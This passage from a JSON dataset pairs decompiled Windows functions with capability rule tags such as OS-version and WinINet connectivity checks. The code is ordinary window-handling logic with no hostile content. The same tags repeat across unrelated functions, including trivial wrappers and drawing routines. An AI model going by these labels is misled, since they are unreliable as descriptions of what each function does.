        "decompiled_code": "\nvoid __fastcall fcn.0046df98(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x46dff4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    (**(*in_EAX + -0x10))();\n    if ((*(in_EAX + 0x26e) != '\\0') && (*(param_2 + 4) == 0)) {\n        puVar1 = *(param_2 + 8);\n        *(in_EAX + 0x279) = *puVar1;\n        *(in_EAX + 0x27d) = puVar1[1];\n        *(in_EAX + 0x281) = puVar1[2];\n        *(in_EAX + 0x285) = puVar1[3];\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 271
    },
    "0046e140": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0046e140(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (*(in_EAX + 0x259) == '\\0') {\n        iVar3 = -1;\n    }\n    else {\n        iVar1 = fcn.0046e124();\n        if (-1 < iVar1 + -1) {\n            do {\n                iVar2 = fcn.00414eec();\n                if (*(iVar2 + 0x259) != '\\0') {\n                    iVar3 = iVar3 + 1;\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 176
    },
    "0046e358": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0046e358(void)\n\n{\n    fcn.0046e2d0();\n    return;\n}\n",
        "token_count": 27
    },
    "0046e4d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e4d4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint arg_ch;\n    uint *arg_10h;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack52 = 0x46e4e6;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.00437d14();\n    uStack52 = 0x46e4ef;\n    cVar1 = fcn.00437e1c();\n    if ((cVar1 != '\\0') && (var_4h[0x67] != 0)) {\n        uStack52 = 0x46e50f;\n        uStack52 = fcn.0044d1c8();\n        puStack56 = 0x46e515;\n        var_ch = sub.user32.dll_GetWindowDC();\n        uStack60 = 0x46e5ca;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        (**(*var_4h + 0x44))();\n        fcn.00406c54();\n        sub.gdi32.dll_ExcludeClipRect(var_ch, var_1ch, var_18h, var_14h, var_10h);\n        sub.gdi32.dll_SetWindowOrgEx(var_ch, -var_4h[0x67], -var_4h[0x67], 0);\n        fcn.00438230();\n        arg_10h = &fcn.0046e4d4::var_28h;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.0044d1c8();\n        fcn.00437fb4(uVar2, arg_ch, arg_10h);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.0044d1c8(var_ch, 0x46e5d1);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    uStack52 = 0x46e5e6;\n    fcn.0044e18c();\n    return;\n}\n",
        "token_count": 590
    },
    "0046e7a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e7a8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0xad]) {\n        iVar2 = fcn.00458424();\n        if ((((iVar2 != 0) && (in_EAX[0xad] != 0)) && (cVar1 = fcn.004492c0(),  cVar1 != '\\0')) &&\n           (fcn.0045cc50(),  in_EAX[0xad] != *(iVar2 + 0x268))) {\n            fcn.0046e140();\n            (**(*in_EAX + 0xe4))();\n            return;\n        }\n        if (param_2 != 0) {\n            fcn.0044580c();\n            fcn.004454cc();\n            if (((iVar2 != 0) && (in_EAX[0xad] != 0)) && (*(iVar2 + 0x268) == in_EAX[0xad])) {\n                cVar1 = fcn.00404154();\n                if (cVar1 == '\\0') {\n                    fcn.0045cc50();\n                }\n                else {\n                    fcn.0045cc50();\n                }\n            }\n        }\n        if (in_EAX[0xad] != 0) {\n            fcn.004454cc();\n        }\n        in_EAX[0xad] = param_2;\n        if (((iVar2 != 0) && (in_EAX[0xad] != 0)) && (*(iVar2 + 0x268) == in_EAX[0xad])) {\n            fcn.0044d7c4();\n        }\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "0046e9b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0046e9b0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    char in_CL;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if (*(*(in_EAX + 0x2b0) + 8) != 0) {\n        iVar1 = fcn.00414f48();\n        iVar3 = iVar1;\n        if (iVar1 == -1) {\n            if (in_CL == '\\0') {\n                iVar1 = 0;\n                iVar3 = iVar1;\n            }\n            else {\n                iVar1 = *(*(in_EAX + 0x2b0) + 8) + -1;\n                iVar3 = iVar1;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar1 == 0) {\n                    iVar1 = *(*(in_EAX + 0x2b0) + 8);\n                }\n                iVar1 = iVar1 + -1;\n            }\n            else {\n                iVar1 = iVar1 + 1;\n                if (iVar1 == *(*(in_EAX + 0x2b0) + 8)) {\n                    iVar1 = 0;\n                }\n            }\n            iVar2 = fcn.00414eec();\n            if (arg_8h == '\\0') {\n                return iVar2;\n            }\n            if (*(iVar2 + 600) != '\\0') {\n                return iVar2;\n            }\n        } while (iVar3 != iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 373
    },
    "0046f4e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0046f4e4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(in_EAX + 0x16) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "0046f4fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0046f4fc(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(in_EAX + 0x16) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "0046f654": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0046f654(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    in_EAX[0x14] = *0x46f708;\n    fcn.0044574c();\n    fcn.00444ca0();\n    fcn.004448f8();\n    iVar1 = (**(*in_EAX + 0xdc))();\n    in_EAX[0x94] = iVar1;\n    iVar1 = fcn.00421624();\n    in_EAX[0x95] = iVar1;\n    fcn.00443e20();\n    *(in_EAX + 0x25d) = 1;\n    fcn.004456d8();\n    *(in_EAX + 0x25f) = 1;\n    fcn.0046fc3c();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 323
    },
    "0046f8f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0046f8f4(uint arg_8h)\n\n{\n    char in_CL;\n    uint var_1h;\n    \n    if (arg_8h != '\\0') {\n        fcn.00441e7c();\n    }\n    if (in_CL == '\\x01') {\n        fcn.0040534c();\n    }\n    else if (in_CL == '\\x02') {\n        fcn.0040534c();\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0046fa64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0046fa64(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x46fa78;\n    cVar1 = fcn.0044d568();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x25c) == '\\0')) {\n        puStack36 = 0x46fa9e;\n        iVar2 = fcn.00415c50();\n        if (0 < iVar2) {\n            puStack36 = 0x46faae;\n            fcn.00444f18();\n            puStack36 = 0x46fac1;\n            fcn.0046f60c();\n            puStack36 = 0x46fad5;\n            iVar2 = fcn.00415c50();\n            if (-1 < iVar2 + -2) {\n                iVar2 = iVar2 + -1;\n                do {\n                    puStack36 = 0x46faf1;\n                    fcn.0046f60c();\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            puStack36 = 0x46fb0a;\n            fcn.0046f5a0();\n            uStack40 = 0x46fbbe;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            puStack36 = &stack0xfffffffc;\n            iVar2 = fcn.00415c50();\n            if (-1 < iVar2 + -1) {\n                do {\n                    piVar3 = fcn.0046f600();\n                    fcn.0046f60c();\n                    (**(*piVar3 + 8))();\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            iVar2 = fcn.00415c50();\n            if (-1 < iVar2 + -1) {\n                do {\n                    fcn.00415c50();\n                    uVar4 = fcn.0046f60c();\n                    piVar3 = fcn.0046f60c(uVar4);\n                    (**(*piVar3 + 8))();\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            *in_FS_OFFSET = uStack44;\n            puStack36 = 0x46fbc5;\n            uStack40 = 0x46fbbd;\n            fcn.00403f58();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 632
    },
    "0046fc3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0046fc3c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25f) != '\\0') {\n        fcn.004456a0();\n        fcn.00420c18();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0046fc6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0046fc6c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_15h;\n    char var_5h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x46fdcf;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    cVar1 = fcn.0044d568();\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0046f60c();\n        if (var_5h == '\\0') {\n            *(iVar2 + 0x19) = 1;\n            uVar3 = fcn.004158f0(&var_15h);\n            uVar3 = fcn.0044d1c8(0x40a, uVar3);\n            sub.user32.dll_SendMessageA(uVar3);\n            uStack72 = 0xffffffff;\n            uVar3 = fcn.0044d1c8(&var_15h);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n        else if (*(iVar2 + 0x19) != '\\0') {\n            *(iVar2 + 0x19) = 0;\n            uVar5 = 0;\n            if (*(iVar2 + 0x15) == '\\0') {\n                uVar5 = 0x100;\n            }\n            else if (*(iVar2 + 0x15) == '\\x02') {\n                uVar5 = 0x200;\n            }\n            cVar1 = fcn.0046f4e4();\n            if (cVar1 != '\\0') {\n                uVar5 = uVar5 | 0x400;\n            }\n            if (*(iVar2 + 0x18) == '\\x01') {\n                uVar5 = uVar5 | 0x1000;\n            }\n            fcn.00404e38();\n            cVar1 = fcn.0046f4fc();\n            if (cVar1 == '\\0') {\n                if (*(iVar2 + 0x14) == '\\x01') {\n                    fcn.0040534c();\n                }\n                else if (*(iVar2 + 0x14) == '\\x02') {\n                    fcn.0040534c();\n                }\n            }\n            else {\n                uVar3 = fcn.0046f4fc();\n                fcn.0046f8f4(uVar3);\n            }\n            uVar3 = fcn.00405264();\n            uVar4 = fcn.004158f0(uVar3);\n            uStack72 = fcn.0044d1c8(0x401, uVar5 | uVar4);\n            sub.user32.dll_SendMessageA();\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    fcn.00404da0(0x46fdd6);\n    return;\n}\n",
        "token_count": 712
    },
    "00470220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470220(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    char cVar3;\n    int32_t *arg_8h;\n    int32_t aiStack31 [4];\n    \n    cVar2 = '\\0';\n    cVar3 = '6';\n    iVar1 = fcn.00458424();\n    if ((iVar1 != 0) && ((*(iVar1 + 0x271) == '\\x02' || (*(iVar1 + 0x271) == '\\x05')))) {\n        arg_8h = aiStack31;\n        fcn.00406c34();\n        fcn.0044811c(arg_8h);\n        iVar1 = fcn.00444f18();\n        if (iVar1 == CONCAT13(param_2, arg_8h >> 8)) {\n            iVar1 = fcn.00444f5c();\n            cVar3 = arg_8h;\n            if (iVar1 == aiStack31[0]) {\n                cVar2 = '\\x01';\n                goto code_r0x0047028c;\n            }\n        }\n        cVar3 = arg_8h;\n        cVar2 = '\\0';\n    }\ncode_r0x0047028c:\n    if ((cVar2 != *(in_EAX + 0x25e)) && (*(in_EAX + 0x25e) = cVar2,  cVar3 != '\\0')) {\n        fcn.00449ecc();\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "0047038c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047038c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0044e820();\n    iVar1 = fcn.00437d14();\n    if (*(iVar1 + 5) == '\\0') {\n        *(in_EAX + 0x50) = *0x47040c;\n    }\n    else {\n        *(in_EAX + 0x50) = *0x470408;\n    }\n    fcn.00444c6c();\n    fcn.00444ca0();\n    *(in_EAX + 0x19c) = 0xffffffff;\n    *(in_EAX + 0x1ae) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 264
    },
    "00470410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00470410(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char in_DL;\n    uint var_1h;\n    \n    if ((*(in_EAX + 0x1ae) == '\\x02') && (in_DL == '\\0')) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if ((cVar1 != '\\0') || (*(in_EAX + 0x6b) != '\\0')) {\n            fcn.00470cd0();\n        }\n    }\n    fcn.00447134(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 169
    },
    "0047046c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0047046c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_1h;\n    \n    fcn.00447400(arg_8h);\n    if ((*(in_EAX + 0x1ae) == '\\x02') && (cVar1 = fcn.004457d4(),  cVar1 != '\\0')) {\n        if ((-1 < in_ECX) && ((iVar2 = fcn.00444f18(),  in_ECX < iVar2 && (-1 < arg_8h)))) {\n            fcn.00444f5c();\n        }\n        fcn.00470cd0();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "004704d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.004704d4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char in_DL;\n    uint var_2h;\n    \n    fcn.004474ac(arg_8h, arg_ch);\n    if ((in_DL == '\\0') && (-1 < arg_ch)) {\n        iVar1 = fcn.00444f18();\n        if ((arg_ch < iVar1) && (-1 < arg_8h)) {\n            iVar1 = fcn.00444f5c();\n            if ((arg_8h <= iVar1) && (*(in_EAX + 0x1ae) == '\\x02')) {\n                fcn.00470cd0();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "004705ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004705ec(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    bool bVar5;\n    bool bVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((((in_EDX == *(in_EAX + 0x40)) && (in_ECX == *(in_EAX + 0x44))) && (arg_ch == *(in_EAX + 0x48))) &&\n        (arg_8h == *(in_EAX + 0x4c))) ||\n       (((*(in_EAX + 0x1b0) != 0 || ((*(in_EAX + 0x1c) & 1) != 0)) || (*(in_EAX + 0x1b4) == 0)))) {\n        fcn.004449e0(arg_8h, arg_ch);\n    }\n    else {\n        iVar3 = fcn.00471004();\n        iVar4 = fcn.0047304c(in_ECX);\n        bVar5 = iVar4 != iVar3;\n        if (bVar5) {\n            bVar2 = false;\n            iVar4 = fcn.00471004();\n            if (iVar4 < iVar3) {\n                fcn.00471004();\n            }\n        }\n        else if ((*(in_EAX + 0x1ae) - 3U < 2) && (arg_ch != *(in_EAX + 0x48))) {\n            bVar2 = true;\n            bVar5 = bVar2;\n        }\n        else {\n            bVar2 = false;\n            bVar5 = bVar2;\n        }\n        if ((*(in_EAX + 0x1ae) == '\\x02') &&\n           ((iVar3 = fcn.0046cb64(),  0x40046 < iVar3 || (*(*(in_EAX + 0x1b4) + 0x28a) == '\\0')))) {\n            arg_ch = (arg_ch + *(*(in_EAX + 0x1b4) + 0x260)) - *(in_EAX + 0x48);\n        }\n        if ((*(in_EAX + 0x1ae) - 3U < 2) || (arg_ch == *(*(in_EAX + 0x1b4) + 0x260))) {\n            bVar1 = false;\n        }\n        else {\n            bVar1 = true;\n        }\n        bVar6 = arg_8h != *(*(in_EAX + 0x1b4) + 0x264);\n        if (bVar2) {\n            fcn.004449e0(arg_8h, arg_ch);\n        }\n        if ((*(in_EAX + 0x1c) & 0x10) != 0) {\n            if (bVar1) {\n                fcn.00471ba0();\n            }\n            if (bVar6) {\n                fcn.00471b70();\n            }\n        }\n        if (((!bVar5) || (bVar1)) || (bVar6)) {\n            fcn.004718bc();\n        }\n        else {\n            if (bVar2) {\n                if (*(in_EAX + 0x1ae) - 3U < 2) {\n                    fcn.0047216c();\n                }\n                else {\n                    fcn.00472278();\n                }\n            }\n            fcn.00472eb8();\n            fcn.00471a20();\n        }\n    }\n    return;\n}\n",
        "token_count": 829
    },
    "00470a60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t fcn.00470a60(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(in_EAX + 0x19a) != '\\0') && (uVar2 = *0x491ea6,  *(in_EAX + 0x1ae) == '\\x01')) {\n        uVar2 = *0x491ea4;\n    }\n    cVar1 = (**(*in_EAX + 0x50))();\n    if (((cVar1 != '\\0') || (*(in_EAX + 0x6b) != '\\0')) &&\n       ((in_EAX[0x6d] == NULL || (cVar1 = (**(*in_EAX[0x6d] + 0x50))(),  cVar1 != '\\0')))) {\n        uVar2 = uVar2 | *0x491ea8;\n    }\n    if ((*(in_EAX + 0x57) == '\\0') && ((*(in_EAX + 7) & 0x10) == 0)) {\n        uVar2 = uVar2 | *0x491eaa;\n    }\n    if ((*(in_EAX + 0x68) != '\\0') || (*(in_EAX + 0x6b) != '\\0')) {\n        uVar2 = uVar2 | *0x491eac;\n    }\n    if (*(in_EAX + 0x1ad) != '\\0') {\n        uVar2 = uVar2 | *0x491eae;\n    }\n    if (*(in_EAX + 0x1a1) != '\\0') {\n        uVar2 = uVar2 | *0x491eb2;\n    }\n    return uVar2;\n}\n",
        "token_count": 406
    },
    "00470b74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470b74(uint param_1, uint32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x19a) = (param_2 & 3) != 0;\n    (**(*in_EAX + 0x68))();\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        fcn.004454cc();\n    }\n    if ((*(in_EAX + 0x19a) == '\\0') && ((param_2 & 0x10) != 0)) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0x68) = uVar1;\n    *(in_EAX + 0x1ad) = (param_2 & 0x20) != 0;\n    *(in_EAX + 0x1a1) = (param_2 & 0x80) != 0;\n    return;\n}\n",
        "token_count": 242
    },
    "00470cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470cd0(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t arg_8h;\n    \n    if ((param_2 != *(in_EAX + 0x19a)) && (*(in_EAX + 0x19a) = param_2,  *(in_EAX + 0x1b4) != 0)) {\n        arg_8h = param_2;\n        fcn.00471004();\n        fcn.00446870(arg_8h);\n        fcn.004724d4();\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00470d68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470d68(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 != in_EAX[0x67]) && (in_EAX[0x67] = param_2,  in_EAX[0x6d] != 0)) {\n        (**(*in_EAX + 0x9c))();\n        fcn.00471004();\n        fcn.00446870(param_2);\n        if ((*(in_EAX[0x6d] + 0x290) != '\\0') || (*(in_EAX[0x6d] + 0x28a) != '\\0')) {\n            (**(*in_EAX + 0x80))();\n        }\n        if (((*(in_EAX + 7) & 1) == 0) && (*(in_EAX + 0x1ae) == '\\x05')) {\n            fcn.00472c98();\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "00470ee8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470ee8(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x1ae)) {\n        *(in_EAX + 0x1ae) = param_2;\n        (**(*in_EAX + 0x80))();\n        if (((*(in_EAX + 7) & 1) == 0) && (in_EAX[0x6d] != 0)) {\n            if ((*(in_EAX[0x6d] + 0x288) == '\\0') &&\n               ((*(in_EAX[0x6d] + 0x25c) == '\\0' || (*(in_EAX + 0x1ae) != '\\x05')))) {\n                if (*(in_EAX + 0x1ae) - 3U < 2) {\n                    (**(*in_EAX + 0x9c))();\n                }\n                else if (*(in_EAX + 0x1ae) == '\\x02') {\n                    fcn.00472c98();\n                }\n                else {\n                    (**(*in_EAX + 0xa0))();\n                }\n                fcn.00472eb8();\n                fcn.00471004();\n                fcn.00471a20();\n            }\n            else {\n                iVar1 = in_EAX[0x6d];\n                *(iVar1 + 0x260) = 0;\n                *(iVar1 + 0x264) = 0;\n                fcn.00472c98();\n            }\n            fcn.00404154();\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "00470fcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
